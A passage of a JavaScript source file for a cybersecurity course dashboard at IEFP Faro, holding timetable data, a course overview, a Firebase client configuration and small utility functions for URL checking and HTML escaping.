"uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-23", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "15:00-16:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "16:00-17:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}]}, {"data": "2026-06-24", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "10:00-11:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "11:00-12:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "12:00-13:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-25", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "15:00-16:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "16:00-17:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}]}, {"data": "2026-06-26", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-29", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-30", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "15:00-16:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "16:00-17:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}]}], "ucs_identificadas": ["UC00034", "UC00599", "UC00606", "UC00634", "UC00635", "UC01476", "UC01477", "UC01480"]}, {"instituicao": "IEFP Faro", "modalidade": "Presencial", "designacao": "CET Cibersegurança", "mes_ano": "julho 2026", "dias": [{"data": "2026-07-01", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00634"}, {"hora": "10:00-11:00", "uc": "UC00634"}, {"hora": "11:00-12:00", "uc": "UC00634"}, {"hora": "12:00-13:00", "uc": "UC00634"}, {"hora": "14:00-15:00", "uc": "UC01480"}, {"hora": "15:00-16:00", "uc": "UC01480"}, {"hora": "16:00-17:00", "uc": "UC01480"}]}, {"data": "2026-07-02", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00606"}, {"hora": "10:00-11:00", "uc": "UC00606"}, {"hora": "11:00-12:00", "uc": "UC00606"}, {"hora": "12:00-13:00", "uc": "UC00606"}]}, {"data": "2026-07-03", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00634"}, {"hora": "10:00-11:00", "uc": "UC00634"}, {"hora": "11:00-12:00", "uc": "UC00634"}, {"hora": "12:00-13:00", "uc": "UC00634"}, {"hora": "14:00-15:00", "uc": "UC00034"}, {"hora": "15:00-16:00", "uc": "UC00034"}]}, {"data": "2026-07-06", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477"}, {"hora": "10:00-11:00", "uc": "UC01477"}, {"hora": "11:00-12:00", "uc": "UC01477"}, {"hora": "12:00-13:00", "uc": "UC01477"}]}, {"data": "2026-07-07", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599"}, {"hora": "10:00-11:00", "uc": "UC00599"}, {"hora": "11:00-12:00", "uc": "UC00599"}, {"hora": "12:00-13:00", "uc": "UC00599"}, {"hora": "14:00-15:00", "uc": "UC01480"}, {"hora": "15:00-16:00", "uc": "UC01480"}, {"hora": "16:00-17:00", "uc": "UC01480"}]}, {"data": "2026-07-08", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477"}, {"hora": "10:00-11:00", "uc": "UC01477"}, {"hora": "11:00-12:00", "uc": "UC01477"}, {"hora": "12:00-13:00", "uc": "UC01477"}, {"hora": "14:00-15:00", "uc": "UC01480"}, {"hora": "15:00-16:00", "uc": "UC01480"}, {"hora": "16:00-17:00", "uc": "UC01491"}]}, {"data": "2026-07-09", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477"}, {"hora": "10:00-11:00", "uc": "UC01477"}, {"hora": "11:00-12:00", "uc": "UC01477"}, {"hora": "12:00-13:00", "uc": "UC01477"}]}, {"data": "2026-07-10", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC01491"}, {"hora": "10:00-11:00", "uc": "UC01491"}, {"hora": "11:00-12:00", "uc": "UC01491"}, {"hora": "12:00-13:00", "uc": "UC01491"}, {"hora": "14:00-15:00", "uc": "UC00634"}, {"hora": "15:00-16:00", "uc": "UC00634"}, {"hora": "16:00-17:00", "uc": "UC00634"}]}, {"data": "2026-07-13", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477"}, {"hora": "10:00-11:00", "uc": "UC01477"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00633"}, {"hora": "15:00-16:00", "uc": "UC00633"}, {"hora": "16:00-17:00", "uc": "UC00633"}]}, {"data": "2026-07-14", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599"}, {"hora": "10:00-11:00", "uc": "UC00599"}, {"hora": "14:00-15:00", "uc": "UC00606"}, {"hora": "15:00-16:00", "uc": "UC00606"}, {"hora": "16:00-17:00", "uc": "UC00606"}]}, {"data": "2026-07-15", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00633"}, {"hora": "15:00-16:00", "uc": "UC00633"}, {"hora": "16:00-17:00", "uc": "UC00633"}]}, {"data": "2026-07-16", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00606"}, {"hora": "10:00-11:00", "uc": "UC00606"}, {"hora": "11:00-12:00", "uc": "UC00606"}, {"hora": "12:00-13:00", "uc": "UC00606"}, {"hora": "14:00-15:00", "uc": "UC00633"}, {"hora": "15:00-16:00", "uc": "UC00633"}, {"hora": "16:00-17:00", "uc": "UC00633"}]}, {"data": "2026-07-17", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC01491"}, {"hora": "10:00-11:00", "uc": "UC01491"}, {"hora": "11:00-12:00", "uc": "UC01491"}, {"hora": "12:00-13:00", "uc": "UC01491"}, {"hora": "14:00-15:00", "uc": "UC01491"}, {"hora": "15:00-16:00", "uc": "UC01491"}, {"hora": "16:00-17:00", "uc": "UC01491"}]}, {"data": "2026-07-20", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00633"}, {"hora": "15:00-16:00", "uc": "UC00633"}, {"hora": "16:00-17:00", "uc": "UC00633"}]}, {"data": "2026-07-21", "dia_semana": "TER", "aulas": [{"hora": "14:00-15:00", "uc": "UC01478"}, {"hora": "15:00-16:00", "uc": "UC01478"}, {"hora": "16:00-17:00", "uc": "UC01478"}]}, {"data": "2026-07-22", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC01491"}, {"hora": "10:00-11:00", "uc": "UC01491"}, {"hora": "11:00-12:00", "uc": "UC01491"}, {"hora": "12:00-13:00", "uc": "UC01491"}, {"hora": "14:00-15:00", "uc": "UC01491"}, {"hora": "15:00-16:00", "uc": "UC01491"}, {"hora": "16:00-17:00", "uc": "UC01491"}]}, {"data": "2026-07-23", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC01478"}, {"hora": "10:00-11:00", "uc": "UC01478"}, {"hora": "11:00-12:00", "uc": "UC01478"}, {"hora": "12:00-13:00", "uc": "UC01478"}]}, {"data": "2026-07-24", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC01491"}, {"hora": "10:00-11:00", "uc": "UC01491"}, {"hora": "11:00-12:00", "uc": "UC01491"}, {"hora": "12:00-13:00", "uc": "UC01491"}, {"hora": "14:00-15:00", "uc": "UC01491"}, {"hora": "15:00-16:00", "uc": "UC01491"}, {"hora": "16:00-17:00", "uc": "UC01491"}]}, {"data": "2026-07-27", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00616"}, {"hora": "15:00-16:00", "uc": "UC00616"}, {"hora": "16:00-17:00", "uc": "UC00616"}]}, {"data": "2026-07-28", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00633"}, {"hora": "10:00-11:00", "uc": "UC00633"}, {"hora": "11:00-12:00", "uc": "UC00633"}, {"hora": "12:00-13:00", "uc": "UC00633"}, {"hora": "14:00-15:00", "uc": "UC01478"}, {"hora": "15:00-16:00", "uc": "UC01478"}, {"hora": "16:00-17:00", "uc": "UC01478"}]}, {"data": "2026-07-29", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC01491"}, {"hora": "10:00-11:00", "uc": "UC01491"}, {"hora": "11:00-12:00", "uc": "UC01491"}, {"hora": "12:00-13:00", "uc": "UC01491"}, {"hora": "14:00-15:00", "uc": "UC01491"}, {"hora": "15:00-16:00", "uc": "UC01491"}, {"hora": "16:00-17:00", "uc": "UC01491"}]}, {"data": "2026-07-30", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00633"}, {"hora": "10:00-11:00", "uc": "UC00633"}, {"hora": "11:00-12:00", "uc": "UC00633"}, {"hora": "12:00-13:00", "uc": "UC00633"}, {"hora": "14:00-15:00", "uc": "UC00616"}, {"hora": "15:00-16:00", "uc": "UC00616"}, {"hora": "16:00-17:00", "uc": "UC00616"}]}, {"data": "2026-07-31", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00633"}, {"hora": "10:00-11:00", "uc": "UC00633"}, {"hora": "11:00-12:00", "uc": "UC00633"}, {"hora": "12:00-13:00", "uc": "UC00633"}, {"hora": "14:00-15:00", "uc": "UC01478"}, {"hora": "15:00-16:00", "uc": "UC01478"}, {"hora": "16:00-17:00", "uc": "UC01478"}]}]}, {"mes_ano": "agosto 2026", "dias": [{"data": "2026-08-24", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00616"}, {"hora": "15:00-16:00", "uc": "UC00616"}, {"hora": "16:00-17:00", "uc": "UC00616"}]}, {"data": "2026-08-25", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00598"}, {"hora": "15:00-16:00", "uc": "UC00598"}, {"hora": "16:00-17:00", "uc": "UC00598"}]}, {"data": "2026-08-26", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00616"}, {"hora": "10:00-11:00", "uc": "UC00616"}, {"hora": "11:00-12:00", "uc": "UC00616"}, {"hora": "12:00-13:00", "uc": "UC00616"}, {"hora": "14:00-15:00", "uc": "UC00616"}, {"hora": "15:00-16:00", "uc": "UC00616"}, {"hora": "16:00-17:00", "uc": "UC00616"}]}, {"data": "2026-08-27", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC01478"}, {"hora": "10:00-11:00", "uc": "UC01478"}, {"hora": "11:00-12:00", "uc": "UC01478"}, {"hora": "12:00-13:00", "uc": "UC01478"}, {"hora": "14:00-15:00", "uc": "UC01478"}, {"hora": "15:00-16:00", "uc": "UC01478"}, {"hora": "16:00-17:00", "uc": "UC01478"}]}, {"data": "2026-08-28", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC01478"}, {"hora": "10:00-11:00", "uc": "UC01478"}, {"hora": "11:00-12:00", "uc": "UC01478"}, {"hora": "12:00-13:00", "uc": "UC01478"}, {"hora": "14:00-15:00", "uc": "UC00616"}, {"hora": "15:00-16:00", "uc": "UC00616"}, {"hora": "16:00-17:00", "uc": "UC00616"}]}, {"data": "2026-08-31", "dia_semana": "DOM", "aulas": [{"hora": "09:00-10:00", "uc": "UC00616"}, {"hora": "10:00-11:00", "uc": "UC00616"}, {"hora": "11:00-12:00", "uc": "UC00616"}, {"hora": "12:00-13:00", "uc": "UC00616"}, {"hora": "14:00-15:00", "uc": "UC00616"}, {"hora": "15:00-16:00", "uc": "UC00616"}]}]}, {"instituicao": "Centro de Emprego e Formação Profissional de Faro", "modalidade": "Cursos de Especialização Tecnológica - CET", "designacao": "Técnico/a Especialista em Cibersegurança", "codigo_financeiro": "481110E0007", "codigo_administrativo": "11650885", "nivel": 5, "mes_ano": "setembro 2026", "horario_diario": "09:00-17:00", "dias": [{"data": "2026-09-01", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00598"}, {"hora": "15:00-16:00", "uc": "UC00598"}, {"hora": "16:00-17:00", "uc": "UC00598"}]}, {"data": "2026-09-02", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC01478"}, {"hora": "10:00-11:00", "uc": "UC01481"}, {"hora": "11:00-12:00", "uc": "UC01481"}, {"hora": "12:00-13:00", "uc": "UC01481"}, {"hora": "14:00-15:00", "uc": "UC00598"}, {"hora": "15:00-16:00", "uc": "UC00598"}, {"hora": "16:00-17:00", "uc": "UC00598"}]}, {"data": "2026-09-03", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00633"}, {"hora": "15:00-16:00", "uc": "UC00633"}, {"hora": "16:00-17:00", "uc": "UC00633"}]}, {"data": "2026-09-04", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC01491"}, {"hora": "10:00-11:00", "uc": "UC01491"}, {"hora": "11:00-12:00", "uc": "UC01491"}, {"hora": "12:00-13:00", "uc": "UC01491"}, {"hora": "14:00-15:00", "uc": "UC01491"}, {"hora": "15:00-16:00", "uc": "UC01491"}, {"hora": "16:00-17:00", "uc": "UC01491"}]}, {"data": "2026-09-07", "dia_semana": "SEG", "aulas": [], "nota": "Feriado Municipal — Dia da Cidade (Faro)"}, {"data": "2026-09-08", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC01481"}, {"hora": "10:00-11:00", "uc": "UC01481"}, {"hora": "11:00-12:00", "uc": "UC01481"}, {"hora": "12:00-13:00", "uc": "UC01481"}, {"hora": "14:00-15:00", "uc": "UC00633"}, {"hora": "15:00-16:00", "uc": "UC00633"}, {"hora": "16:00-17:00", "uc": "UC00633"}]}, {"data": "2026-09-09", "dia_semana": "QUA", "aulas": [{"hora": "14:00-15:00", "uc": "UC01481"}, {"hora": "15:00-16:00", "uc": "UC01481"}, {"hora": "16:00-17:00", "uc": "UC01481"}]}, {"data": "2026-09-10", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}, {"hora": "14:00-15:00", "uc": "UC00598"}, {"hora": "15:00-16:00", "uc": "UC00598"}, {"hora": "16:00-17:00", "uc": "UC00598"}]}, {"data": "2026-09-11", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC01491"}, {"hora": "10:00-11:00", "uc": "UC01491"}, {"hora": "11:00-12:00", "uc": "UC01491"}, {"hora": "12:00-13:00", "uc": "UC01491"}, {"hora": "14:00-15:00", "uc": "UC01491"}, {"hora": "15:00-16:00", "uc": "UC01491"}, {"hora": "16:00-17:00", "uc": "UC01491"}]}, {"data": "2026-09-14", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01481"}, {"hora": "10:00-11:00", "uc": "UC01481"}, {"hora": "11:00-12:00", "uc": "UC01481"}, {"hora": "12:00-13:00", "uc": "UC01481"}, {"hora": "14:00-15:00", "uc": "UC00633"}, {"hora": "15:00-16:00", "uc": "UC00633"}, {"hora": "16:00-17:00", "uc": "UC00633"}]}, {"data": "2026-09-15", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00633"}, {"hora": "10:00-11:00", "uc": "UC00633"}, {"hora": "11:00-12:00", "uc": "UC00633"}, {"hora": "12:00-13:00", "uc": "UC00633"}]}, {"data": "2026-09-16", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00598"}, {"hora": "10:00-11:00", "uc": "UC00598"}, {"hora": "11:00-12:00", "uc": "UC00598"}, {"hora": "12:00-13:00", "uc": "UC00598"}]}, {"data": "2026-09-17", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00633"}, {"hora": "10:00-11:00", "uc": "UC00633"}, {"hora": "11:00-12:00", "uc": "UC00633"}, {"hora": "12:00-13:00", "uc": "UC00633"}, {"hora": "14:00-15:00", "uc": "UC01479"}, {"hora": "15:00-16:00", "uc": "UC01479"}, {"hora": "16:00-17:00", "uc": "UC01479"}]}, {"data": "2026-09-18", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC01491"}, {"hora": "10:00-11:00", "uc": "UC01491"}, {"hora": "11:00-12:00", "uc": "UC01491"}, {"hora": "12:00-13:00", "uc": "UC01491"}, {"hora": "14:00-15:00", "uc": "UC01491"}, {"hora": "15:00-16:00", "uc": "UC01491"}, {"hora": "16:00-17:00", "uc": "UC01491"}]}, {"data": "2026-09-21", "dia_semana": "SEG", "aulas": [{"hora": "14:00-15:00", "uc": "UC01479"}, {"hora": "15:00-16:00", "uc": "UC01479"}, {"hora": "16:00-17:00", "uc": "UC01479"}]}, {"data": "2026-09-22", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00633"}, {"hora": "10:00-11:00", "uc": "UC00633"}, {"hora": "11:00-12:00", "uc": "UC00633"}, {"hora": "12:00-13:00", "uc": "UC00633"}, {"hora": "14:00-15:00", "uc": "UC01481"}, {"hora": "15:00-16:00", "uc": "UC01481"}, {"hora": "16:00-17:00", "uc": "UC01481"}]}, {"data": "2026-09-23", "dia_semana": "QUA", "aulas": [{"hora": "14:00-15:00", "uc": "UC01481", "tipo": "teste"}, {"hora": "15:00-16:00", "uc": "UC01481", "tipo": "teste"}, {"hora": "16:00-17:00", "uc": "UC01481", "tipo": "teste"}]}, {"data": "2026-09-24", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC01481", "modalidade": "remoto"}, {"hora": "10:00-11:00", "uc": "UC01481", "modalidade": "remoto"}, {"hora": "11:00-12:00", "uc": "UC01481", "modalidade": "remoto"}, {"hora": "12:00-13:00", "uc": "UC01481", "modalidade": "remoto"}, {"hora": "14:00-15:00", "uc": "UC01479"}, {"hora": "15:00-16:00", "uc": "UC01479"}, {"hora": "16:00-17:00", "uc": "UC01479"}]}, {"data": "2026-09-25", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC01489"}, {"hora": "10:00-11:00", "uc": "UC01489"}, {"hora": "11:00-12:00", "uc": "UC01489"}, {"hora": "12:00-13:00", "uc": "UC01489"}, {"hora": "14:00-15:00", "uc": "UC01481", "modalidade": "remoto"}, {"hora": "15:00-16:00", "uc": "UC01482", "modalidade": "remoto"}, {"hora": "16:00-17:00", "uc": "UC01482", "modalidade": "remoto"}]}, {"data": "2026-09-28", "dia_semana": "SEG", "aulas": [{"hora": "14:00-15:00", "uc": "UC01479"}, {"hora": "15:00-16:00", "uc": "UC01479"}, {"hora": "16:00-17:00", "uc": "UC01479"}]}, {"data": "2026-09-29", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00633"}, {"hora": "10:00-11:00", "uc": "UC00633"}, {"hora": "11:00-12:00", "uc": "UC00633"}, {"hora": "12:00-13:00", "uc": "UC00633"}, {"hora": "14:00-15:00", "uc": "UC01479"}, {"hora": "15:00-16:00", "uc": "UC01479"}, {"hora": "16:00-17:00", "uc": "UC01479"}]}, {"data": "2026-09-30", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00633"}, {"hora": "10:00-11:00", "uc": "UC01487"}, {"hora": "11:00-12:00", "uc": "UC01487"}, {"hora": "12:00-13:00", "uc": "UC01487"}, {"hora": "14:00-15:00", "uc": "UC01482"}, {"hora": "15:00-16:00", "uc": "UC01482"}, {"hora": "16:00-17:00", "uc": "UC01482"}]}], "ucs_identificadas": ["UC00598", "UC00633", "UC01478", "UC01479", "UC01481", "UC01482", "UC01487", "UC01489", "UC01491"]}];
        const CRONOGRAMA  = {"designacao": "Técnico/a Especialista em Cibersegurança", "instituicao": "Centro de Emprego e Formação Profissional de Faro", "responsavel_acao": "Célia Palma", "data_inicio": "2026-04-09", "data_fim": "2027-04-06", "local": "Areial Gordo - Faro", "sala": "6.25", "horario": "09:00-17:00", "carga_horaria": {"base": 175, "tecnologica": 850, "fct": 500, "total": 1525}, "resumo_mensal": [{"mes": "Abril 2026", "dias": 16, "horas_mes": 112, "horas_totais": 112}, {"mes": "Maio 2026", "dias": 20, "horas_mes": 140, "horas_totais": 252}, {"mes": "Junho 2026", "dias": 19, "horas_mes": 133, "horas_totais": 385}, {"mes": "Julho 2026", "dias": 23, "horas_mes": 161, "horas_totais": 546}, {"mes": "Agosto 2026", "dias": 11, "horas_mes": 77, "horas_totais": 623}, {"mes": "Setembro 2026", "dias": 22, "horas_mes": 154, "horas_totais": 777}, {"mes": "Outubro 2026", "dias": 21, "horas_mes": 147, "horas_totais": 924}, {"mes": "Novembro 2026", "dias": 21, "horas_mes": 147, "horas_totais": 1071}, {"mes": "Dezembro 2026", "dias": 7, "horas_mes": 0, "horas_totais": 1071}, {"mes": "Janeiro 2027", "dias": 20, "horas_mes": 0, "horas_totais": 1071}, {"mes": "Fevereiro 2027", "dias": 19, "horas_mes": 0, "horas_totais": 1071}, {"mes": "Março 2027", "dias": 22, "horas_mes": 0, "horas_totais": 1071}, {"mes": "Abril 2027", "dias": 4, "horas_mes": 0, "horas_totais": 1071}]};
        const CLOUDRUN_URL = "https://cybersec-playground-6cqyexq2pq-ew.a.run.app";


        // ── FIREBASE ────────────────────────────────────────────────────
        firebase.initializeApp({
            apiKey:            "AIzaSyAU6CzykxWF76ZsVYN9pjQf41nc6VdD4fw",
            authDomain:        "ligafaro-8000.firebaseapp.com",
            projectId:         "ligafaro-8000",
            storageBucket:     "ligafaro-8000.firebasestorage.app",
            appId:             "1:315653817267:web:19943348fb9aca311681c6"
        });
        const auth    = firebase.auth();
        const storage = firebase.storage();
        const db      = firebase.firestore();




        // ── UTILS ────────────────────────────────────────────────────────
        function isSafeUrl(url) {
            if (!url || typeof url !== 'string') return false;
            try {
                const p = new URL(url);
                return p.protocol === 'https:' || p.protocol === 'http:';
            } catch { return false; }
        }

        const SHORT_NAME_OVERRIDES = {
            'Jose Gabriel Fernandes Chaveca': 'Gabriel Chaveca',
        };

        function shortName(name) {
            if (!name) return '';
            if (SHORT_NAME_OVERRIDES[name]) return SHORT_NAME_OVERRIDES[name];
            const parts = name.trim().split(/\s+/);
            if (parts.length <= 2) return name;
            return parts[0] + ' ' + parts[parts.length - 1];
        }

        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
        }


        // ── STATE ───────────────────────────────────────────────────────
        let currentView         = 'dashboard';
        let previousView        = 'dashboard';
        let navStack            = []; // navigation history stack for back buttons
        let currentUCCode       = null;
